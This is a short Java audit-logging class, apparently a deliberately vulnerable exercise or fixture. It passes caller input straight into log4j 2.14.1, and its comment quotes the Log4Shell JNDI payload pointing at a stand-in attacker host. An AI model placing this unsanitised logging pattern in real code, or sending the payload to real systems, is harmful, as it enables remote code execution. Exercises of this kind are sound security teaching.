package com.example.svc;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Logs audit events. The vulnerability is ordinary and realistic: a caller-supplied value
 * is passed straight into the log message. On log4j 2.14.1 a value like
 * {@code ${jndi:ldap://attacker/a}} is interpreted and triggers a remote JNDI lookup
 * (CVE-2021-44228, "Log4Shell").
 *
 * The fix is not in this file — it is a dependency version bump. That is deliberate: the most
 * common real-world vulnerability is an outdated dependency, and the honest fix is to upgrade
 * it, which this service's own tests then prove did not change its behaviour.
 */
public class AuditLogger {

    private static final Logger LOG = LogManager.getLogger(AuditLogger.class);

    /** Returns the message that was logged, so tests can assert on normal behaviour. */
    public String write(String actor, String action) {
        String line = "audit: actor=" + actor + " action=" + action;
        LOG.info(line);
        return line;
    }
}
